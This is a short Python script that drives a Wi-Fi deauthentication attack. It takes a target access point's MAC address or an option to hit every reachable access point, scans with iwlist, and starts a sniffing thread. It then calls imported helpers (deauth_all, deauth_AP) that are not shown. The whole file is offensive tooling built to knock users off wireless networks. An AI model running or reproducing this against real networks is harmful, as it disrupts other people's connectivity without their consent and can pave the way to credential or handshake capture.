from deauth_utils import *
from wifi_utils import *
from sniff_utils import launch_sniffing
import argparse
from threading import Thread
from signal import SIGINT, signal


def parse_args():
	parser = argparse.ArgumentParser(argument_default=argparse.SUPPRESS)
	# parser.add_argument("-i", "--interface", default="wlan0",
    #                  help="Use this interface.")
	parser.add_argument("-b", "--bssid", default="",
                     help="Deauth AP that has this MAC address.")
	parser.add_argument("--all", default=False,
	                    action="store_true", help="Deauth all reachable APs.")
	parser.add_argument("-s", "--skip", nargs='*',
	                    default=[], help="skip those BSSIDs.")
	return parser.parse_args()


if __name__ == "__main__":
	args = parse_args()
	atexit.register(exit_handler)
	interfaces = get_interfaces()
	iface = interfaces[0]  # we will use just one interface for now.
	iwlist_scan(iface)
	prepare_attack()
	hop = Thread(target=launch_sniffing, args=(args.skip,))
	hop.daemon = True
	hop.start()
	if args.all:
		deauth_all(args.skip)
	else:
		deauth_AP(args.bssid)